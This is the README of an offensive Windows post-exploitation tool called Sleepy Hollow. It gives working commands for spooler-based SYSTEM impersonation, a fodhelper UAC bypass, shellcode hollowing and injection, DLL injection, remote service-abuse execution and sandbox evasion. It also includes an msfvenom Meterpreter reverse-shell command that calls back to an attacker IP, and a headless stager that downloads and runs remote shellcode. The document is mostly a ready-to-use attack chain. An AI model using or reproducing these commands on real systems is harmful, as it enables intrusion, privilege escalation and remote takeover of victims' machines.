# Sleepy Hollow

## Build

Requirements: _.NET 8 SDK_

Build native AOT executable with `dotnet publish -c Release --self-contained`

If you want a smaller executable, compress the executable with [upx](https://upx.github.io/):  `upx.exe -9 -o stager.exe .\SleepyHollow.exe`

## Usage

Use `SleepyHollow.exe` to see the usage information.

```text
Usage: SleepyHollow.exe <command> [options]
Commands:
  user  - displays privileges of current user

  spool - impersonates SYSTEM by abusing SpoolService
    --pipe: name of pipe (optional - will autogenerate name)
    --payload: path/URL to payload (ignored if --cmd is used)
    --cmd: command to execute after impersonation (optional)

  uac   - bypasses UAC by abusing fodhelper.exe
    --cmd: command to execute as Administrator

  sc    - executes shellcode 
    --payload: path/URL to shellcode
    --method: hollow/inject
    --wait: seconds to wait before exiting

  dll  - injects DLL into process
    --path: path/URL to DLL
    --processName: process to inject into

  rexec - executes command on remote host
    --hostname: hostname to connect to
    --cmd: command to execute
    --service: service to abuse
    --raw: execute command without prepending cmd.exe /c

Global options:
  --skip-evasion: skips sandbox evasion techniques
  --debug: enables debug output

```

## Examples

To generate the shellcode, we use `msfvenom`:

```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.219 LPORT=4444 EXITFUNC=thread -f hex -o sc.txt
```

The only important thing is that the shellcode is in hex format using `-f hex`. The other parameters can be set as you wish.

Host this file on a web server.

### SpoolService

```bash
SleepyHollow.exe spool --payload http://<your_ip>/sc.txt
```

### Execute shellcode

This defaults to hollowing, but you can also inject the shellcode into a process by using `--method inject`.

```bash 
SleepyHollow.exe sc --payload http://<your_ip>/sc.txt
```

### UAC bypass

```bash
SleepyHollow.exe uac --cmd "C:\Windows\System32\cmd.exe /c whoami > C:\Users\Public\whoami.txt"
```

### Remote execution

This abuses the `SensorService` to execute commands on a remote host. You can use `--service` to specify a different service to abuse.

You can also use `--raw` to execute a command without prepending `cmd.exe /c

```bash
SleepyHollow.exe rexec --hostname <hostname> --cmd "whoami > C:\Users\Public\whoami.txt"
```

## Headless mode

You can run SleepyHollow in headless mode by using the `GenStager.ps1` script. This will build an executable that will execute shellcode without the need for a command line.

```powershell
./GenStager.ps1 -PayloadURL http://<your_ip>/sc.txt -OutFile stager.exe
```

When executed, this will download the shellcode from the url and execute. You can use this to execute shellcode on a remote host by using `rexec` if you have uploaded the file to the target host:

```bash
SleepyHollow.exe rexec --hostname <hostname> --service <service> --cmd "C:\Users\Public\stager.exe"
```

## References

* [Abusing Spooler to get SYSTEM](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

## Credits

* [SpoolSample](https://github.com/leechristensen/SpoolSample)
